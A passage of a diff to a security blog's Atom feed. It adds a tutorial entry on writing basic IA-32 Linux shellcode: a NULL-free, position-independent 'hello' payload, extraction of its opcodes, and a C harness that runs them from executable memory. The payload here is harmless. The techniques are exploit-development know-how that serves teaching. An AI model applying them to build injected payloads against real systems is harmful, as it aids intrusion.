@@ -4,7 +4,7 @@
   <title><![CDATA[0x73696e65]]></title>
   <link href="http://73696e65.github.io/atom.xml" rel="self"/>
   <link href="http://73696e65.github.io/"/>
-  <updated>2015-06-23T09:12:40+02:00</updated>
+  <updated>2015-06-23T17:12:29+02:00</updated>
   <id>http://73696e65.github.io/</id>
   <author>
     <name><![CDATA[Norbert Szetei]]></name>
@@ -12,6 +12,1140 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[IA-32 Linux Shellcode Basics 1]]></title>
+    <link href="http://73696e65.github.io/blog/2015/06/23/ia-32-linux-shellcode-basics-1/"/>
+    <updated>2015-06-23T15:01:28+02:00</updated>
+    <id>http://73696e65.github.io/blog/2015/06/23/ia-32-linux-shellcode-basics-1</id>
+    <content type="html"><![CDATA[<p>We start with the simple shellcode, that prints <code>hello</code> string. For this
+purpose, we use Kali Linux 32 bit distribution, that could be downloaded
+<a href="https://www.kali.org/downloads/">here</a>.</p>
+
+<p>Because we want to have code as simple as possible, we use tcc ansi compiler and
+nasm assembler.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# aptitude install tcc nasm</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span>hello.c </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">void</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;hello</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# tcc -g hello.c -o hello
+</span><span class='line'>
+</span><span class='line'>root@kali32:/tmp# echo 'set disassembly-flavor intel' >> ~/.gdbinit
+</span><span class='line'>
+</span><span class='line'>root@kali32:/tmp# gdb -q ./hello -ex 'disassemble main' --batch
+</span><span class='line'>BFD: /tmp/hello: no group info for section .text.__i686.get_pc_thunk.bx
+</span><span class='line'>BFD: /tmp/hello: no group info for section .text.__i686.get_pc_thunk.bx
+</span><span class='line'>Dump of assembler code for function main:
+</span><span class='line'>   0x080481e4 &lt;+0>:    push   ebp
+</span><span class='line'>   0x080481e5 &lt;+1>:    mov    ebp,esp
+</span><span class='line'>   0x080481e7 &lt;+3>:    sub    esp,0x0
+</span><span class='line'>   0x080481ed &lt;+9>:    mov    eax,0x8049304
+</span><span class='line'>   0x080481f2 &lt;+14>:   push   eax
+</span><span class='line'>   0x080481f3 &lt;+15>:   call   0x80482e0 &lt;printf>
+</span><span class='line'>   0x080481f8 &lt;+20>:   add    esp,0x4
+</span><span class='line'>   0x080481fb &lt;+23>:   leave  
+</span><span class='line'>   0x080481fc &lt;+24>:   ret    
+</span><span class='line'>End of assembler dump.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>As we can see, the string is located at <code>0x08049304</code> address. However, our code
+should be Position Independent (PIE) and without NULL characters.</p>
+
+<p>To rewrite the code about, we need to:</p>
+
+<ul>
+<li>Look up the number corresponding to the system call in <code>/usr/include/i386-linux-gnu/asm/unistd_32.h</code></li>
+<li>Place system call number in eax, and arguments in ebx, ecx, edx&hellip; in the order they appear in the corresponding man page</li>
+<li>Execute <code>int 0x80</code> to alert the kernel we want to perform a system call</li>
+</ul>
+
+
+<p>Our first try:</p>
+
+<figure class='code'><figcaption><span>hello1.asm </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nf">section</span> <span class="no">.data</span>
+</span><span class='line'><span class="nf">msg</span> <span class="no">db</span> <span class="err">&#39;</span><span class="no">hello</span><span class="err">&#39;</span><span class="p">,</span><span class="mi">0xa</span>
+</span><span class='line'>
+</span><span class='line'><span class="nf">section</span> <span class="no">.text</span>
+</span><span class='line'><span class="nf">global</span> <span class="no">_start</span>
+</span><span class='line'><span class="nl">_start:</span>
+</span><span class='line'>
+</span><span class='line'><span class="err">;</span><span class="nf">write</span><span class="p">(</span><span class="no">int</span> <span class="no">fd</span><span class="p">,</span> <span class="no">char</span> <span class="p">*</span><span class="no">msg</span><span class="p">,</span> <span class="no">unsigned</span> <span class="no">int</span> <span class="no">len</span><span class="p">)</span>
+</span><span class='line'><span class="nf">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="mi">4</span>
+</span><span class='line'><span class="nf">mov</span> <span class="no">ebx</span><span class="p">,</span> <span class="mi">1</span>
+</span><span class='line'><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">msg</span>
+</span><span class='line'><span class="nf">mov</span> <span class="no">edx</span><span class="p">,</span> <span class="mi">6</span>
+</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
+</span><span class='line'>
+</span><span class='line'><span class="err">;</span><span class="nf">exit</span><span class="p">(</span><span class="no">int</span> <span class="no">ret</span><span class="p">)</span>
+</span><span class='line'><span class="nf">mov</span> <span class="no">eax</span><span class="p">,</span><span class="mi">1</span>
+</span><span class='line'><span class="nf">mov</span> <span class="no">ebx</span><span class="p">,</span><span class="mi">0</span>
+</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# nasm -f elf hello1.asm; ld hello1.o -o hello1
+</span><span class='line'>
+</span><span class='line'>root@kali32:/tmp# ./hello1 
+</span><span class='line'>hello</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Dumping instruction bytecode:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# objdump -d hello1 -M intel
+</span><span class='line'>
+</span><span class='line'>hello1:     file format elf32-i386
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Disassembly of section .text:
+</span><span class='line'>
+</span><span class='line'>08048080 &lt;_start>:
+</span><span class='line'> 8048080: b8 04 00 00 00          mov    eax,0x4
+</span><span class='line'> 8048085: bb 01 00 00 00          mov    ebx,0x1
+</span><span class='line'> 804808a: b9 a4 90 04 08          mov    ecx,0x80490a4
+</span><span class='line'> 804808f: ba 06 00 00 00          mov    edx,0x6
+</span><span class='line'> 8048094: cd 80                   int    0x80
+</span><span class='line'> 8048096: b8 01 00 00 00          mov    eax,0x1
+</span><span class='line'> 804809b: bb 00 00 00 00          mov    ebx,0x0
+</span><span class='line'> 80480a0: cd 80                   int    0x80</span></code></pre></td></tr></table></div></figure>
+
+
+<p>When we set 32b register with a small value, the compiler fills the unused
+space with zeros.  Instead, we should use AX = 16b or AL = 8b register parts
+(in the case of register EAX).</p>
+
+<p>Next try:</p>
+
+<figure class='code'><figcaption><span>hello2.asm </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nf">section</span> <span class="no">.data</span>
+</span><span class='line'><span class="nf">msg</span> <span class="no">db</span> <span class="err">&#39;</span><span class="no">hello</span><span class="err">&#39;</span><span class="p">,</span><span class="mi">0xa</span>
+</span><span class='line'>
+</span><span class='line'><span class="nf">section</span> <span class="no">.text</span>
+</span><span class='line'><span class="nf">global</span> <span class="no">_start</span>
+</span><span class='line'><span class="nl">_start:</span>
+</span><span class='line'>
+</span><span class='line'><span class="err">;</span><span class="nf">write</span><span class="p">(</span><span class="no">int</span> <span class="no">fd</span><span class="p">,</span> <span class="no">char</span> <span class="p">*</span><span class="no">msg</span><span class="p">,</span> <span class="no">unsigned</span> <span class="no">int</span> <span class="no">len</span><span class="p">)</span>
+</span><span class='line'><span class="nf">mov</span> <span class="no">al</span><span class="p">,</span> <span class="mi">4</span>
+</span><span class='line'><span class="nf">mov</span> <span class="no">bl</span><span class="p">,</span> <span class="mi">1</span>
+</span><span class='line'><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">msg</span>
+</span><span class='line'><span class="nf">mov</span> <span class="no">dl</span><span class="p">,</span> <span class="mi">6</span>
+</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
+</span><span class='line'>
+</span><span class='line'><span class="err">;</span><span class="nf">exit</span><span class="p">(</span><span class="no">int</span> <span class="no">ret</span><span class="p">)</span>
+</span><span class='line'><span class="nf">mov</span> <span class="no">al</span><span class="p">,</span><span class="mi">1</span>
+</span><span class='line'><span class="nf">mov</span> <span class="no">bl</span><span class="p">,</span><span class="mi">0</span>
+</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# nasm -f elf hello2.asm; ld hello2.o -o hello2
+</span><span class='line'>
+</span><span class='line'>root@kali32:/tmp# ./hello2 
+</span><span class='line'>hello
+</span><span class='line'>
+</span><span class='line'>root@kali32:/tmp# objdump -d hello2 -M intel
+</span><span class='line'>
+</span><span class='line'>hello2:     file format elf32-i386
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Disassembly of section .text:
+</span><span class='line'>
+</span><span class='line'>08048080 &lt;_start>:
+</span><span class='line'> 8048080: b0 04                   mov    al,0x4
+</span><span class='line'> 8048082: b3 01                   mov    bl,0x1
+</span><span class='line'> 8048084: b9 94 90 04 08          mov    ecx,0x8049094
+</span><span class='line'> 8048089: b2 06                   mov    dl,0x6
+</span><span class='line'> 804808b: cd 80                   int    0x80
+</span><span class='line'> 804808d: b0 01                   mov    al,0x1
+</span><span class='line'> 804808f: b3 00                   mov    bl,0x0
+</span><span class='line'> 8048091: cd 80                   int    0x80</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We attempt to make the code position independent pushing string to the stack:</p>
+
+<figure class='code'><figcaption><span>hello3.asm </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nf">section</span> <span class="no">.text</span>
+</span><span class='line'><span class="nf">global</span> <span class="no">_start</span>
+</span><span class='line'><span class="nl">_start:</span>
+</span><span class='line'>
+</span><span class='line'><span class="err">;</span><span class="nf">clear</span> <span class="no">out</span> <span class="no">the</span> <span class="no">registers</span> <span class="no">we</span> <span class="no">are</span> <span class="no">going</span> <span class="no">to</span> <span class="no">need</span>
+</span><span class='line'><span class="nf">xor</span> <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
+</span><span class='line'><span class="nf">xor</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">ebx</span>
+</span><span class='line'><span class="nf">xor</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">ecx</span>
+</span><span class='line'><span class="nf">xor</span> <span class="no">edx</span><span class="p">,</span> <span class="no">edx</span>
+</span><span class='line'>
+</span><span class='line'><span class="err">;</span><span class="nf">write</span><span class="p">(</span><span class="no">int</span> <span class="no">fd</span><span class="p">,</span> <span class="no">char</span> <span class="p">*</span><span class="no">msg</span><span class="p">,</span> <span class="no">unsigned</span> <span class="no">int</span> <span class="no">len</span><span class="p">)</span>
+</span><span class='line'><span class="nf">mov</span> <span class="no">al</span><span class="p">,</span> <span class="mi">4</span>
+</span><span class='line'><span class="nf">mov</span> <span class="no">bl</span><span class="p">,</span> <span class="mi">1</span>
+</span><span class='line'><span class="nf">push</span> <span class="mi">0x58580a6f</span> <span class="err">;</span> <span class="no">push</span> <span class="no">X</span><span class="p">,</span> <span class="no">X</span><span class="p">,</span> <span class="err">\</span><span class="no">n</span><span class="p">,</span> <span class="no">o</span>
+</span><span class='line'><span class="nf">push</span> <span class="mi">0x6c6c6568</span> <span class="err">;</span> <span class="no">push</span> <span class="no">l</span><span class="p">,</span> <span class="no">l</span><span class="p">,</span> <span class="no">e</span><span class="p">,</span> <span class="no">h</span>
+</span><span class='line'><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">esp</span>
+</span><span class='line'><span class="nf">mov</span> <span class="no">dl</span><span class="p">,</span> <span class="mi">6</span>
+</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
+</span><span class='line'>
+</span><span class='line'><span class="err">;</span><span class="nf">exit</span><span class="p">(</span><span class="no">int</span> <span class="no">ret</span><span class="p">)</span>
+</span><span class='line'><span class="nf">mov</span> <span class="no">al</span><span class="p">,</span><span class="mi">1</span>
+</span><span class='line'><span class="nf">xor</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">ebx</span>
+</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# nasm -f elf hello3.asm; ld hello3.o -o hello3
+</span><span class='line'>
+</span><span class='line'>root@kali32:/tmp# ./hello3 
+</span><span class='line'>hello
+</span><span class='line'>
+</span><span class='line'>root@kali32:/tmp# objdump -d hello3 -M intel
+</span><span class='line'>
+</span><span class='line'>hello3:     file format elf32-i386
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Disassembly of section .text:
+</span><span class='line'>
+</span><span class='line'>08048060 &lt;_start>:
+</span><span class='line'> 8048060: 31 c0                   xor    eax,eax
+</span><span class='line'> 8048062: 31 db                   xor    ebx,ebx
+</span><span class='line'> 8048064: 31 c9                   xor    ecx,ecx
+</span><span class='line'> 8048066: 31 d2                   xor    edx,edx
+</span><span class='line'> 8048068: b0 04                   mov    al,0x4
+</span><span class='line'> 804806a: b3 01                   mov    bl,0x1
+</span><span class='line'> 804806c: 68 6f 0a 58 58          push   0x58580a6f
+</span><span class='line'> 8048071: 68 68 65 6c 6c          push   0x6c6c6568
+</span><span class='line'> 8048076: 89 e1                   mov    ecx,esp
+</span><span class='line'> 8048078: b2 06                   mov    dl,0x6
+</span><span class='line'> 804807a: cd 80                   int    0x80
+</span><span class='line'> 804807c: b0 01                   mov    al,0x1
+</span><span class='line'> 804807e: 31 db                   xor    ebx,ebx
+</span><span class='line'> 8048080: cd 80                   int    0x80</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now it looks good, but the 0x0a could sometimes terminate the buffer
+prematurely, so we simply do not use this character.</p>
+
+<figure class='code'><figcaption><span>shell4.asm </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nf">section</span> <span class="no">.text</span>
+</span><span class='line'><span class="nf">global</span> <span class="no">_start</span>
+</span><span class='line'><span class="nl">_start:</span>
+</span><span class='line'>
+</span><span class='line'><span class="err">;</span><span class="nf">clear</span> <span class="no">out</span> <span class="no">the</span> <span class="no">registers</span> <span class="no">we</span> <span class="no">are</span> <span class="no">going</span> <span class="no">to</span> <span class="no">need</span>
+</span><span class='line'><span class="nf">xor</span> <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
+</span><span class='line'><span class="nf">xor</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">ebx</span>
+</span><span class='line'><span class="nf">xor</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">ecx</span>
+</span><span class='line'><span class="nf">xor</span> <span class="no">edx</span><span class="p">,</span> <span class="no">edx</span>
+</span><span class='line'>
+</span><span class='line'><span class="err">;</span><span class="nf">write</span><span class="p">(</span><span class="no">int</span> <span class="no">fd</span><span class="p">,</span> <span class="no">char</span> <span class="p">*</span><span class="no">msg</span><span class="p">,</span> <span class="no">unsigned</span> <span class="no">int</span> <span class="no">len</span><span class="p">)</span>
+</span><span class='line'><span class="nf">mov</span> <span class="no">al</span><span class="p">,</span> <span class="mi">4</span>
+</span><span class='line'><span class="nf">mov</span> <span class="no">bl</span><span class="p">,</span> <span class="mi">1</span>
+</span><span class='line'><span class="nf">push</span> <span class="mi">0x5858586f</span> <span class="err">;</span> <span class="no">push</span> <span class="no">X</span><span class="p">,</span> <span class="no">X</span><span class="p">,</span> <span class="no">X</span><span class="p">,</span> <span class="no">o</span>
+</span><span class='line'><span class="nf">push</span> <span class="mi">0x6c6c6568</span> <span class="err">;</span> <span class="no">push</span> <span class="no">l</span><span class="p">,</span> <span class="no">l</span><span class="p">,</span> <span class="no">e</span><span class="p">,</span> <span class="no">h</span>
+</span><span class='line'><span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">esp</span>
+</span><span class='line'><span class="nf">mov</span> <span class="no">dl</span><span class="p">,</span> <span class="mi">5</span>
+</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
+</span><span class='line'>
+</span><span class='line'><span class="err">;</span><span class="nf">exit</span><span class="p">(</span><span class="no">int</span> <span class="no">ret</span><span class="p">)</span>
+</span><span class='line'><span class="nf">mov</span> <span class="no">al</span><span class="p">,</span><span class="mi">1</span>
+</span><span class='line'><span class="nf">xor</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">ebx</span>
+</span><span class='line'><span class="nf">int</span> <span class="mi">0x80</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# nasm -f elf hello4.asm; ld hello4.o -o hello4
+</span><span class='line'>root@kali32:/tmp# ./hello4 
+</span><span class='line'>hello
+</span><span class='line'>
+</span><span class='line'>root@kali32:/tmp# objdump -d hello4 -M intel
+</span><span class='line'>
+</span><span class='line'>hello4:     file format elf32-i386
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Disassembly of section .text:
+</span><span class='line'>
+</span><span class='line'>08048060 &lt;_start>:
+</span><span class='line'> 8048060: 31 c0                   xor    eax,eax
+</span><span class='line'> 8048062: 31 db                   xor    ebx,ebx
+</span><span class='line'> 8048064: 31 c9                   xor    ecx,ecx
+</span><span class='line'> 8048066: 31 d2                   xor    edx,edx
+</span><span class='line'> 8048068: b0 04                   mov    al,0x4
+</span><span class='line'> 804806a: b3 01                   mov    bl,0x1
+</span><span class='line'> 804806c: 68 6f 58 58 58          push   0x5858586f
+</span><span class='line'> 8048071: 68 68 65 6c 6c          push   0x6c6c6568
+</span><span class='line'> 8048076: 89 e1                   mov    ecx,esp
+</span><span class='line'> 8048078: b2 05                   mov    dl,0x5
+</span><span class='line'> 804807a: cd 80                   int    0x80
+</span><span class='line'> 804807c: b0 01                   mov    al,0x1
+</span><span class='line'> 804807e: 31 db                   xor    ebx,ebx
+</span><span class='line'> 8048080: cd 80                   int    0x80</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now we parse out the opcodes and validate the functionality.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# objdump -d hello4 | tr '[:blank:]' '\n' | egrep '^[0-9a-f]{2}$' | sed 's#^#\\x#' | paste -s -d ''
+</span><span class='line'>\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x68\x6f\x58\x58\x58\x68\x68\x65\x6c\x6c\x89\xe1\xb2\x05\xcd\x80\xb0\x01\x31\xdb\xcd\x80</span></code></pre></td></tr></table></div></figure>
+
+
+<p>If we want to store shellcode to the file:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/tmp# sc=$(objdump -d hello4 | tr '[:blank:]' '\n' | egrep '^[0-9a-f]{2}$' | sed 's#^#\\x#' | paste -s -d '')
+</span><span class='line'>
+</span><span class='line'>root@kali32:/tmp# echo $sc | ruby -e 'print $stdin.read.scan(/\\x(..)/).flatten.map{ |x| x.to_i(16).chr }.join' > hello.shellcode
+</span><span class='line'>
+</span><span class='line'>root@kali32:/tmp# hexdump -C hello.shellcode 
+</span><span class='line'>00000000  31 c0 31 db 31 c9 31 d2  b0 04 b3 01 68 6f 58 58  |1.1.1.1.....hoXX|
+</span><span class='line'>00000010  58 68 68 65 6c 6c 89 e1  b2 05 cd 80 b0 01 31 db  |Xhhell........1.|
+</span><span class='line'>00000020  cd 80                                             |..|
+</span><span class='line'>00000022</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span>test.c </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;sys/mman.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">char</span> <span class="n">sc</span><span class="p">[]</span><span class="o">=</span> <span class="s">&quot;</span><span class="se">\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x68\x6f\x58\x58\x58\x68\x68\x65\x6c\x6c\x89\xe1\xb2\x05\xcd\x80\xb0\x01\x31\xdb\xcd\x80</span><span class="s">&quot;</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+</span><span class='line'>        <span class="kt">void</span> <span class="o">*</span> <span class="n">a</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">4096</span><span class="p">,</span> <span class="n">PROT_EXEC</span> <span class="o">|</span><span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_ANONYMOUS</span> <span class="o">|</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;allocated executable memory at: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
+</span><span class='line'>        <span class="p">((</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span><span class="p">))</span> <span class="n">memcpy</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">sc</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">sc</span><span class="p">)))();</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
